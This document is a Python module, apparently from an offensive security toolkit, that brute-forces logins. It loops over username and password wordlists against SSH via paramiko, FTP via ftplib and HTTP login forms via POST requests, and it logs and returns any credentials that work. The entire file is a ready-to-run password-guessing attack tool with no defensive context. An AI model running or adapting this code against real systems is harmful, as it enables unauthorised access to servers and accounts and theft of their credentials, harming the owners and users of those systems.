import paramiko
import ftplib
import requests
from typing import List, Dict, Optional
from utils.helpers import read_wordlist
from utils.logger import get_logger

logger = get_logger("BruteForceModule")


def run(target: str, service: str, username_list: str, password_list: str, port: Optional[int] = None, **kwargs) -> Dict:
    """
    Entry point for the brute force module.

    Args:
        target (str): Target IP or hostname.
        service (str): Service to brute-force (e.g., ssh, ftp, http).
        username_list (str): Path to usernames wordlist.
        password_list (str): Path to passwords wordlist.
        port (Optional[int]): Custom port (default depends on service).
        **kwargs: Additional options (e.g., timeout)

    Returns:
        Dict: Result with success credentials or errors.
    """
    usernames = read_wordlist(username_list)
    passwords = read_wordlist(password_list)

    if not usernames or not passwords:
        logger.error("Username or password list is empty or invalid.")
        return {"error": "Invalid wordlists."}

    logger.info(f"Starting brute-force on {target}:{port or 'default'} using {service.upper()}")

    if service.lower() == "ssh":
        return brute_force_ssh(target, usernames, passwords, port or 22)
    elif service.lower() == "ftp":
        return brute_force_ftp(target, usernames, passwords, port or 21)
    elif service.lower() == "http":
        return brute_force_http(target, usernames, passwords, **kwargs)
    else:
        return {"error": f"Unsupported service: {service}"}


def brute_force_ssh(host: str, usernames: List[str], passwords: List[str], port: int) -> Dict:
    results = {"service": "ssh", "success": None, "attempts": 0}
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for user in usernames:
        for pwd in passwords:
            results["attempts"] += 1
            try:
                client.connect(hostname=host, username=user, password=pwd, port=port, timeout=3)
                logger.success(f"SSH credentials found: {user}:{pwd}")
                results["success"] = {"username": user, "password": pwd}
                client.close()
                return results
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                logger.warning(f"SSH error: {e}")
                continue

    return results


def brute_force_ftp(host: str, usernames: List[str], passwords: List[str], port: int) -> Dict:
    results = {"service": "ftp", "success": None, "attempts": 0}

    for user in usernames:
        for pwd in passwords:
            results["attempts"] += 1
            try:
                with ftplib.FTP() as ftp:
                    ftp.connect(host, port, timeout=3)
                    ftp.login(user, pwd)
                    logger.success(f"FTP credentials found: {user}:{pwd}")
                    results["success"] = {"username": user, "password": pwd}
                    return results
            except ftplib.error_perm:
                continue
            except Exception as e:
                logger.warning(f"FTP error: {e}")
                continue

    return results


def brute_force_http(url: str, usernames: List[str], passwords: List[str], **kwargs) -> Dict:
    results = {"service": "http", "success": None, "attempts": 0}
    timeout = kwargs.get("timeout", 5)
    login_endpoint = kwargs.get("login_endpoint", "/login")
    username_field = kwargs.get("username_field", "username")
    password_field = kwargs.get("password_field", "password")

    full_url = f"{url.rstrip('/')}{login_endpoint}"

    for user in usernames:
        for pwd in passwords:
            results["attempts"] += 1
            try:
                payload = {username_field: user, password_field: pwd}
                response = requests.post(full_url, data=payload, timeout=timeout)
                if response.status_code == 200 and "invalid" not in response.text.lower():
                    logger.success(f"HTTP credentials found: {user}:{pwd}")
                    results["success"] = {"username": user, "password": pwd}
                    return results
            except Exception as e:
                logger.warning(f"HTTP error: {e}")
                continue

    return results
